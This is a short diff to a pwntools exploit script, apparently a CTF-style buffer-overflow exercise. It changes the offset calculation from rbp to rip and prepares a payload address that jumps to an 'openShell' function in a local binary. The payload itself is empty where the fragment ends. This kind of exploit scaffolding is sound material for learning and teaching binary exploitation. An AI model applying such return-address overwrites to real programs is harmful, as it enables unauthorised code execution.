@@ -87,7 +87,7 @@ from pwn import *
 p = process('./program.elf')
 e = ELF('./program.elf')
 
-offset = rbp - locationOfInput
+offset = rip - locationOfInput
 addressToJumpTo = p64(e.symbols['openShell']) # p32 or p64 is based on if it is a 32 or 64 bit program. use `file` or `checksec` on binary to check
 
 payload = b''
